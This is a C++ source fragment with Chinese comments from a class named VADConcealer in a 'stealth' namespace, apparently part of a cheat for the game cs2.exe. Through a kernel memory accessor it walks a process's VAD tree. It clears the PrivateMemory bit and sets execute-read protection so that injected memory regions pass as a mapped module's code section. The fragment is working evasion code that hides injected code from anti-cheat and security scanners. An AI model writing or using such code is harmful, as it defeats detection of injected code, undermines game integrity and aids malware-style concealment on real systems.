            // 检查 PrivateMemory bit 是否已设置
            if (flags & VadOffsets::PrivateMemoryBit) {
                // 清零 PrivateMemory bit → MEM_MAPPED
                flags &= ~VadOffsets::PrivateMemoryBit;

                // 设置 Protection = EXECUTE_READ (5), 模拟 .text 段映射
                flags &= ~VadOffsets::ProtectionMask;
                flags |= (5ULL << 19); // Protection = 5 = PAGE_EXECUTE_READ

                kma.Write<uint64_t>(vadNode + VadOffsets::VadFlags, flags);

                // 同时尝试修改 ControlArea → FilePointer 指向已知模块
                // 这可以进一步降低可疑度, 但需要额外解析
                // 跳过: 仅修改 PrivateMemory + Protection 已经够用

                return true;
            }
            return false; // 已经是 MAPPED
        }

        // AVL 遍历: 根据 VPN 决定走左子树还是右子树
        uint64_t left  = kma.Read<uint64_t>(vadNode + VadOffsets::RbnLeft);
        uint64_t right = kma.Read<uint64_t>(vadNode + VadOffsets::RbnRight);

        if (targetVpn < startVpn) {
            vadNode = left;
        } else {
            vadNode = right;
        }
    }
    return false;
}

bool VADConcealer::ConcealRegion(DWORD pid, uintptr_t regionBase, SIZE_T regionSize) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive() || !regionBase) return false;

    uint64_t ntosBase = kma.GetNtoskrnlBase();
    if (!ntosBase) return false;

    // 获取 cs2.exe 的 EPROCESS
    uint64_t eprocess = GetEPROCESSByPid(kma, pid, ntosBase);
    if (!eprocess) return false;

    // 尝试两个可能的 VadRoot 偏移
    uint64_t vadRoot = 0;
    for (uint32_t vadOff : {VadOffsets::VadRoot, VadOffsets::VadRootAlt}) {
        vadRoot = kma.Read<uint64_t>(eprocess + vadOff);
        if (vadRoot && vadRoot > 0xFFFF800000000000ULL) break;
    }
    if (!vadRoot || vadRoot < 0xFFFF800000000000ULL) return false;

    // 遍历 VAD 树, 查找并修改匹配区域
    return FindAndModifyVadNode(kma, vadRoot, regionBase);
}

int VADConcealer::ConcealAllRegions(DWORD pid, const uintptr_t* bases, int count) {
    int success = 0;
    for (int i = 0; i < count && i < 32; i++) {
        if (bases[i] && ConcealRegion(pid, bases[i], 0x10000)) {
            success++;
        }
    }
    return success;
}

} // namespace stealth
